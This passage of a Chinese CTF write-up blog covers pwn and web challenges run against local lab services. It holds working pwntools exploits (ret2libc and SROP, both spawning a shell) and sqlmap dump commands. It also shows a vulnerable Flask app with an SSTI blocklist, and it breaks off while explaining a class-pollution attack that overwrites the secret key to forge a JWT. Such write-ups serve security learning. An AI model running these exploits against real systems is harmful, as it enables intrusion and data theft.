class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> PIPE</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">os.environ.setdefault(<span class="string">&quot;PWNLIB_CACHE_DIR&quot;</span>, <span class="string">&quot;./.pwncache&quot;</span>)</span><br><span class="line">os.makedirs(<span class="string">&quot;./.pwncache&quot;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">context.cache_dir = <span class="string">&quot;./.pwncache&quot;</span></span><br><span class="line"></span><br><span class="line">context.binary = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">HOST, PORT = <span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">58982</span></span><br><span class="line"></span><br><span class="line">POP_RDI_RET = <span class="number">0x400713</span></span><br><span class="line">RET = <span class="number">0x4004c9</span></span><br><span class="line">PUTS_PLT = context.binary.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">PUTS_GOT = context.binary.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">MAIN = context.binary.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">OFFSET = <span class="number">0x18</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>(<span class="params">p</span>):</span><br><span class="line">    payload = flat(</span><br><span class="line">        <span class="string">b&quot;A&quot;</span> * OFFSET,</span><br><span class="line">        POP_RDI_RET,</span><br><span class="line">        PUTS_GOT,</span><br><span class="line">        PUTS_PLT,</span><br><span class="line">        MAIN,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;No backdoors this time!\n&quot;</span>, payload)</span><br><span class="line">    leak_line = p.recvline().rstrip(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    leak_line += <span class="string">b&quot;\x00&quot;</span> * (<span class="number">8</span> - <span class="built_in">len</span>(leak_line))</span><br><span class="line">    leak_addr = u64(leak_line)</span><br><span class="line">    libc_base = leak_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">f&quot;Leaked puts@GLIBC: <span class="subst">&#123;<span class="built_in">hex</span>(leak_addr)&#125;</span>&quot;</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;Computed libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    p = start()</span><br><span class="line"></span><br><span class="line">    libc_base = leak_libc(p)</span><br><span class="line"></span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">f&quot;system @ <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;&#x27;/bin/sh&#x27; @ <span class="subst">&#123;<span class="built_in">hex</span>(bin_sh)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = flat(</span><br><span class="line">        <span class="string">b&quot;A&quot;</span> * OFFSET,</span><br><span class="line">        RET,</span><br><span class="line">        POP_RDI_RET,</span><br><span class="line">        bin_sh,</span><br><span class="line">        system,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;No backdoors this time!\n&quot;</span>, payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011140719018.png" alt="image-20251011140719018"></p><h3 id="Easy-syscall"><a href="#Easy-syscall" class="headerlink" title="Easy-syscall"></a>Easy-syscall</h3><p>打SROP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./pwn&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_payload</span>() -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = constants.SYS_execve</span><br><span class="line">    frame.rdi = <span class="built_in">next</span>(elf.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">    frame.rsi = <span class="number">0</span></span><br><span class="line">    frame.rdx = <span class="number">0</span></span><br><span class="line">    frame.rsp = elf.bss() + <span class="number">0x800</span></span><br><span class="line">    frame.rip = elf.sym[<span class="string">&quot;magic&quot;</span>] + <span class="number">0xF</span> </span><br><span class="line"></span><br><span class="line">    frame_bytes = <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join(</span><br><span class="line">        [</span><br><span class="line">            <span class="string">b&quot;A&quot;</span> * <span class="number">48</span>,</span><br><span class="line">            frame_bytes[:<span class="number">8</span>],           </span><br><span class="line">            p64(elf.sym[<span class="string">&quot;magic&quot;</span>]),</span><br><span class="line">            frame_bytes[<span class="number">8</span>:],</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path, stdin=PIPE, stdout=PIPE)</span><br><span class="line">    host = args.HOST <span class="keyword">or</span> <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="built_in">int</span>(args.PORT <span class="keyword">or</span> <span class="number">57192</span>)</span><br><span class="line">    <span class="keyword">return</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    io = connect()</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;hidden here...\n&quot;</span>)</span><br><span class="line">    io.send(build_payload())</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011141020356.png" alt="image-20251011141020356"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="EZ-SQL"><a href="#EZ-SQL" class="headerlink" title="EZ_SQL"></a>EZ_SQL</h3><p>sqlmap一把梭</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:61945/&quot; --data=&quot;id=2&quot; -p id --batch --random-agent --threads=5 --level=3 --risk=2 --dbs --banner --current-user</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:61945/&quot; --data=&quot;id=2&quot; -p id -D welcome --tables --batch --union-cols=3</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:61945/&quot; --data=&quot;id=2&quot; -p id -D welcome -T flag --columns --batch --union-cols=3</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:61945/&quot; --data=&quot;id=2&quot; -p id -D welcome -T flag --dump --batch --union-cols=3</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011141705666.png" alt="image-20251011141705666"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011141757578.png" alt="image-20251011141757578"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011141935919.png" alt="image-20251011141935919"></p><h3 id="EZ-Login（签到"><a href="#EZ-Login（签到" class="headerlink" title="EZ_Login（签到)"></a>EZ_Login（签到)</h3><p>密码是simple 弱密码爆破</p><p>本地管理员要求xff 127.0.0.1</p><p>进去后解码 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJmbGFnIjoiVFNDVEYtSnt3MzFjMG0zXzcwXzdoM193MzhfajB1cm4zeX0ifQ.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSCTF-J&#123;w31c0m3_70_7h3_w38_j0urn3y&#125;</span><br></pre></td></tr></table></figure><h3 id="Druid"><a href="#Druid" class="headerlink" title="Druid"></a>Druid</h3><p>访问127.0.0.1:druid&#x2F;v2&#x2F;sql</p><p>密码也是admin</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011144836197.png" alt="image-20251011144836197"></p><h3 id="EZ-PY"><a href="#EZ-PY" class="headerlink" title="EZ_PY"></a>EZ_PY</h3><p>提示source</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:58379/source</span><br></pre></td></tr></table></figure><p>拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template_string</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">24</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户数据库</span></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&quot;c1432&quot;</span>: <span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_response</span>(<span class="params">message: <span class="built_in">str</span>, code: <span class="built_in">int</span> = <span class="number">200</span>, data=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Unified response format&quot;&quot;&quot;</span></span><br><span class="line">    resp = &#123;<span class="string">&#x27;message&#x27;</span>: message&#125;</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        resp[<span class="string">&#x27;data&#x27;</span>] = data</span><br><span class="line">    <span class="keyword">return</span> jsonify(resp), code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf_filter</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> input_str:</span><br><span class="line">        <span class="keyword">return</span> input_str</span><br><span class="line">    input_str = <span class="built_in">str</span>(input_str)</span><br><span class="line">    dangerous_strings = [</span><br><span class="line">        <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;bases&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;write&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;session&#x27;</span>, <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;get_flashed_messages&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&#123;%&#x27;</span>, <span class="string">&#x27;%&#125;&#x27;</span>, <span class="string">&#x27;&#123;#&#x27;</span>, <span class="string">&#x27;#&#125;&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> string <span class="keyword">in</span> dangerous_strings:</span><br><span class="line">        <span class="keyword">if</span> string <span class="keyword">in</span> input_str:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;WAF blocked: Dangerous pattern detected&quot;</span></span><br><span class="line"></span><br><span class="line">    filtered = input_str.replace(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    filtered = filtered.replace(<span class="string">&#x27;javascript:&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    filtered = filtered.replace(<span class="string">&#x27;onload=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    filtered = filtered.replace(<span class="string">&#x27;onerror=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;hello&quot;</span> <span class="keyword">in</span> filtered:</span><br><span class="line">        filtered = filtered.replace(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;hacker&quot;</span> <span class="keyword">in</span> filtered:</span><br><span class="line">        filtered = filtered.replace(<span class="string">&quot;hacker&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> filtered</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, role=<span class="string">&#x27;user&#x27;</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.role = role</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token_required</span>(<span class="params">f</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">f</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.headers.get(<span class="string">&#x27;Authorization&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&#x27;Authorization token is required.&#x27;</span>, <span class="number">401</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            token = token.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>]  <span class="comment"># 提取令牌，假设格式为 &#x27;Bearer &lt;token&gt;&#x27;</span></span><br><span class="line">            data = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">            current_user = data[<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line">            role = data[<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">f&#x27;Invalid token: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>, <span class="number">401</span>)</span><br><span class="line">        <span class="keyword">return</span> f(current_user, role, *args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    user = User()</span><br><span class="line">    merge(data, user)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user.username <span class="keyword">or</span> <span class="keyword">not</span> user.password:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    users[user.username] = user.password</span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="string">&#x27;Registration successful.&#x27;</span>, <span class="number">201</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    auth = request.json</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> auth:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    username = auth.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = auth.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    <span class="keyword">if</span> users.get(username) != password:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Invalid username or password.&#x27;</span>, <span class="number">401</span>)</span><br><span class="line">    token = jwt.encode(</span><br><span class="line">        &#123;<span class="string">&#x27;user&#x27;</span>: username, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;,</span><br><span class="line">        app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>],</span><br><span class="line">        algorithm=<span class="string">&quot;HS256&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/protected&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@token_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">protected</span>(<span class="params">current_user, role</span>):</span><br><span class="line">    <span class="keyword">if</span> role != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(</span><br><span class="line">            <span class="string">f&#x27;Access denied: User <span class="subst">&#123;current_user&#125;</span> (<span class="subst">&#123;role&#125;</span>) does not have sufficient privileges.&#x27;</span>,</span><br><span class="line">            <span class="number">403</span></span><br><span class="line">        )</span><br><span class="line">    filtered_user = waf_filter(current_user)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(</span><br><span class="line">        <span class="string">f&quot;Hello, <span class="subst">&#123;filtered_user&#125;</span>! You have access to this protected resource.&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;source/index.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_page</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;source/register.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/success&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">success_page</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;source/success.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_source</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>merge 在 register 请求体上递归地对 User 对象和其类做任意属性赋值，可以一路改写 User.<em>init</em>_.<strong>globals</strong>[‘app’].config[‘SECRET_KEY’]，从而把随机密钥换成指定的值；之后就能自己签发 JWT。</p><p>waf_filter 只做字符串替换，hello→，其黑名单又可以用字符串拼接和 %c 生成函数绕过，因此可以把用户名字段变成任意 Jinja 表达式并触发 SSTI</p><p>先把密钥改成已知值如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 